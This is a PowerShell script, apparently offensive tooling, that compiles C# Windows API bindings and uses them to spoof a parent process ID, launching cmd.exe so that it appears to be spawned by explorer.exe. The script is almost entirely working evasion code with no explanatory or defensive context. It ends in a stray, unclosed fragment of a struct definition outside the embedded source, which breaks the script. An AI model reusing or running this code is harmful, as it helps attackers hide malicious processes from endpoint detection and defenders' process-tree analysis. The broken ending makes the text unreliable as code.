$src = @'
using System;
using System.Runtime.InteropServices;

public class PpidSpoof {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFOEX {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, ref IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
}
'@
Add-Type -TypeDefinition $src
$parent = Get-Process -Name explorer | Select-Object -First 1
$hParent = [PpidSpoof]::OpenProcess(0x1FFFFF, $false, $parent.Id)
$si = New-Object PpidSpoof+STARTUPINFOEX
$si.StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$size = [IntPtr]::Zero
[PpidSpoof]::InitializeProcThreadAttributeList([IntPtr]::Zero, 1, 0, [ref]$size) | Out-Null
$si.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[PpidSpoof]::InitializeProcThreadAttributeList($si.lpAttributeList, 1, 0, [ref]$size) | Out-Null
$hRef = $hParent
[PpidSpoof]::UpdateProcThreadAttribute($si.lpAttributeList, 0, [IntPtr]0x00020000, [ref]$hRef, [IntPtr]::Size, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
$pi = New-Object PpidSpoof+PROCESS_INFORMATION
[PpidSpoof]::CreateProcess($null, "cmd.exe", [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x00080000, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi) | Out-Null
[PpidSpoof]::DeleteProcThreadAttributeList($si.lpAttributeList)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($si.lpAttributeList)

[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFOEX {
public STARTUPINFO StartupInfo;
public IntPtr lpAttributeList;

